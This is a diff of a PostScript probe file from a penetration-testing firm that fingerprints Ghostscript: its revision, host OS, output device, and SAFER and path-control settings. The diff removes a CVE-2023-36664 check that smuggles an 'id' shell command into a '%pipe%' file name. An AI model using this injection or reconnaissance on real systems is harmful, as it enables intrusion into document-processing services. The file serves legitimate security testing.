@@ -1,20 +1,20 @@
 %!PS-Adobe-3.0 EPSF-3.0
 %%Pages: 1
-%%BoundingBox:   36   36  576  756
+%%BoundingBox:   0 0  1000 1000
 %%LanguageLevel: 1
 %%EndComments
 %%BeginProlog
 %%EndProlog
 
-1 1 1 setrgbcolor clippath fill
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%                                      %
+%  RedTeam Pentesting GmbH             %
+%  kontakt@redteam-pentesting.de       %
+%  https://www.redteam-pentesting.de/  %
+%                                      %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
 
-/pagewidth currentpagedevice /PageSize get 1 get def
-
-/curpos pagewidth def
-
-/interval pagewidth 20 div def
-
-/Courier findfont interval scalefont setfont
+/initialdevicename currentpagedevice /OutputDevice get 100 string cvs def
 
 /showline {
     0 0 0 setrgbcolor
@@ -24,33 +24,87 @@
 } def
 
 /concat { exch dup length
-  2 index length add string
-  dup dup 4 2 roll copy length
-  4 -1 roll putinterval
+    2 index length add string
+    dup dup 4 2 roll copy length
+    4 -1 roll putinterval
 } bind def
+
+% output filename
+
+currentpagedevice /OutputFile known {
+    /outputfilename currentpagedevice /OutputFile get def
+} {
+    /outputfilename (undefined) def
+} ifelse
+
+% OS Detection
+% LIBPATH contains paths, on linux they begin with %rom% or similar, or /, on windows with %rom% or c:/
+
+/detectedos (undetected) def
+systemdict /LIBPATH get {
+    /curpath exch def
+    curpath (c:/) search {
+        pop pop
+        /detectedos (Windows) def
+    } if
+    pop
+    curpath (/usr) search {
+        pop pop
+        /detectedos (Linux) def
+    } if
+        pop
+} forall
+
+/pathcontrolstate false def
+
+systemdict /SAFER known {
+    /saferline SAFER 100 string cvs def
+    /pathcontrolstate SAFER def
+} {
+    /saferline (not set?) def
+} ifelse
+
+systemdict /DELAYSAFER known {
+    /delaysaferline DELAYSAFER 100 string cvs def
+} {
+    /delaysaferline () def
+} ifelse
+
+systemdict /.currentpathcontrolstate known {
+    /pathcontrolstateline .currentpathcontrolstate 100 string cvs def
+    /pathcontrolstate .currentpathcontrolstate def
+} {
+    % old versions of ghostscript do not have .currentpathcontrolstate
+    /pathcontrolstateline () def
+} ifelse
+
+%%%%%%%%%%%%%%%%%%% Drawing Code
+
+1 1 1 setrgbcolor clippath fill
+
+/pagewidth currentpagedevice /PageSize get 1 get def
+
+/curpos pagewidth def
+
+/interval pagewidth 25 div def
+
+/Courier findfont interval scalefont setfont
 
 0 1 5 { () showline pop } for
 (Ghostscript detected) showline
-() showline
-(Revision : ) revision 10 string cvs concat showline
-(Rev date : ) revisiondate 10 string cvs concat showline
-(Product : ) showline
-() product 20 string cvs concat showline
+(Revision         : ) revision 10 string cvs concat showline
+(Rev date         : ) revisiondate 10 string cvs concat showline
+(Detected OS      : ) detectedos concat showline
+(OutputDevice     : ) initialdevicename concat showline
+(OutputFilename   : ) outputfilename concat showline
+(SAFER            : ) saferline concat showline
 
-systemdict /SAFER get {
-  (dSAFER is enabled) showline
+pathcontrolstateline () eq not {
+    (Pathcontrolstate : ) pathcontrolstateline concat showline
+} if
 
-  % try CVE-2023-36664
-  {
-    (%pipe%id&/../%rom%lib/test) (r) file
-  } stopped {
-    (CVE-2023-36664 patched) showline
-  }{
-    (CVE-2023-36664 works!!) showline
-  } ifelse % error catching frame
-}{
-  (dSAFER is disabled!!) showline
-} ifelse % error catching frame
+delaysaferline () eq not {
+    (DELAYSAFER       : ) delaysaferline concat showline
+} if 
 
 showpage
-0 quit
